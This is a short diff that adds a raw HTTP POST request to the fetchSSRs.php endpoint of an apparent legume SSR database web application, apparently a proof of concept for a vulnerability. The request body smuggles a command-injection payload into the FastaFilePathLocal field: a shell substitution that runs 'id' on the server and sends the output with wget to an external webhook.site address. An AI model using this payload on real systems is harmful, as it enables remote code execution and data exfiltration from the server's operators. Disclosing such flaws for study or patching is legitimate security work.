@@ -1,0 +1,14 @@
+POST /legumeSSRdb/fetchSSRs.php HTTP/1.1
+Host: xxx
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
+Accept: */*
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Connection: close
+Cookie: _ga=GA1.2.1253258619.1620055512; _gid=GA1.2.1110916899.1620055512; _gat_gtag_UA_119048537_13=1
+Upgrade-Insecure-Requests: 1
+Content-Length: 102
+
+FastaFilePathLocal=$(wget	https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b --post-data=$(id))
